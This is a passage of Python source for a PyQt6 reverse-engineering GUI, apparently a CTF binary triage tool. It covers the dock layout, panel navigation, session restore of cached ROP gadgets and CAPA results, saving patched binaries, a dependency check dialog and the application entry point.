            ('scripting',  'Scripting',          Qt.DockWidgetArea.BottomDockWidgetArea, False),
        ]

        first_by_area: Dict[int, QDockWidget] = {}
        for key, title, area, visible in DOCK_CONFIG:
            self._ensure_panel(key)
            if key not in self._panels: continue
            dock = QDockWidget(title, self)
            dock.setObjectName(f'dock_{key}')
            dock.setWidget(self._panels[key])
            dock.setFeatures(QDockWidget.DockWidgetFeature.DockWidgetMovable |
                             QDockWidget.DockWidgetFeature.DockWidgetFloatable |
                             QDockWidget.DockWidgetFeature.DockWidgetClosable)
            if area in first_by_area:
                self.tabifyDockWidget(first_by_area[area], dock)
            else:
                self.addDockWidget(area, dock)
                first_by_area[area] = dock
            dock.setVisible(True)
            self._docks[key] = dock

        # Remove placeholder central widget
        if self.centralWidget() and isinstance(self.centralWidget(), QLabel):
            self.setCentralWidget(None)
        # Raise disasm tab to front
        if 'disasm' in self._docks: self._docks['disasm'].raise_()

    def _ensure_panel(self, key: str):
        """Lazy-build a panel if it hasn't been constructed yet."""
        if key not in self._panels and key in self._lazy_panels:
            log.info(f'Lazy-building panel: {key}')
            self._panels[key] = self._lazy_panels[key]()
            self._lazy_built.discard(key)
            # Wire up signal routing for lazy panels
            if key == 'capa':
                self._panels['capa'].navigate_to.connect(self._navigate_global)

    def _show_dock(self, key: str):
        self._ensure_panel(key)
        if key in self._docks:
            dock = self._docks[key]
            dock.show(); dock.raise_()

    def _reset_layout(self):
        if self.loader: self._build_dock_layout()

    def _navigate_global(self, addr: int):
        """Route a navigate-to-addr signal to the correct panel."""
        self._show_dock('disasm')
        if 'disasm' in self._panels:
            self._panels['disasm'].navigate_to_addr(addr)

    def _find_string_in_disasm(self, s: str):
        self._show_dock('disasm')
        if 'disasm' in self._panels:
            self._panels['disasm']._search_edit.setText(s)
            self._panels['disasm']._search()

    def _global_search(self):
        if not self.loader: return
        dlg = GlobalSearchDialog(self.loader, self.disasm, self)
        dlg.navigate_to.connect(self._navigate_global)
        dlg.exec()

    def _load_session(self):
        if not self.loader: return
        data = self.loader.load_session(self.comments, self.bookmarks)
        if 'disasm'    in self._panels: self._panels['disasm']._render()
        if 'bookmarks' in self._panels: self._panels['bookmarks'].refresh()
        # Restore ROP gadgets from cache
        if 'rop' in self._panels and data.get('rop_gadgets'):
            rop_panel = self._panels['rop']
            rop_panel.rop.gadgets.clear(); rop_panel.rop._by_class.clear()
            for entry in data['rop_gadgets']:
                g = ROPGadget(entry['addr'],
                              [{'address': entry['addr'], 'mnemonic': p.split()[0] if p.split() else '',
                                'op_str': ' '.join(p.split()[1:]) if len(p.split()) > 1 else ''}
                               for p in [entry['text']]])
                g.text = entry['text']
                rop_panel.rop.gadgets.append(g)
                for cls in g.classes:
                    rop_panel.rop._by_class[cls].append(g)
            rop_panel._populate_cls_tree()
            rop_panel._populate_gadget_table(rop_panel.rop.gadgets[:1000])
            rop_panel._count_lbl.setText(
                f'{len(rop_panel.rop.gadgets):,} gadgets (from session cache)')
        # Restore CAPA summary
        if 'capa' in self._panels and data.get('capa_summary'):
            self._panels['capa']._status.setText(
                data['capa_summary'] + '  (restored from session)')
        n_rop = len(data.get('rop_gadgets', []))
        self._status.showMessage(
            f'Session loaded  ({n_rop} ROP gadgets, '
            f'{len(self.bookmarks.bookmarks)} bookmarks)')

    def _save_patched(self):
        if not self.loader: return
        path, _ = QFileDialog.getSaveFileName(self, 'Save Patched Binary', self.loader.path+'_patched')
        if path:
            self.loader.save_patched(path)
            self._status.showMessage(f'Saved patched binary to {path}')

    def _show_deps(self):
        import PyQt6.QtCore as _pq6
        pq6_ver = _pq6.PYQT_VERSION_STR
        deps = {
            f'PyQt6  {pq6_ver}  ← active': True,
            'capstone':   HAS_CAPSTONE,
            'pyelftools': HAS_PYELFTOOLS,
            'pefile':     HAS_PEFILE,
            'lief':       HAS_LIEF,
            'r2pipe':     HAS_R2PIPE,
            'keystone':   HAS_KEYSTONE,
            'qtawesome':  HAS_QTA,
            'pwntools':   HAS_PWNTOOLS,
            'triton':     HAS_TRITON,
            'capa':       HAS_CAPA,
            'angr':       HAS_ANGR,
            'z3':         HAS_Z3,
        }
        lines = [f'{"✅" if v else "❌"}  {k}' for k, v in deps.items()]
        QMessageBox.information(self, 'Dependencies', '\n'.join(lines))

    def closeEvent(self, event):
        if self.loader:
            self.loader.close()
        event.accept()


# ══════════════════════════════════════════════════════════════════════
# Entry point
# ══════════════════════════════════════════════════════════════════════
def main():
    # Qt6 handles HiDPI automatically — no setAttribute needed
    app = QApplication(sys.argv)
    app.setApplicationName('CTF Ultimate Triage v4')
    app.setStyleSheet(QSS)

    # Apply qt-material on top if available
    try:
        import qt_material
        qt_material.apply_stylesheet(app, theme='dark_teal.xml', invert_secondary=False)
        # Re-apply critical overrides after qt-material
        app.setStyleSheet(app.styleSheet() + '\n' + QSS)
    except ImportError: pass

    path = sys.argv[1] if len(sys.argv) > 1 else None
    win = MainWindow(path)
    win.show()
    sys.exit(app.exec())


if __name__ == '__main__':
    main()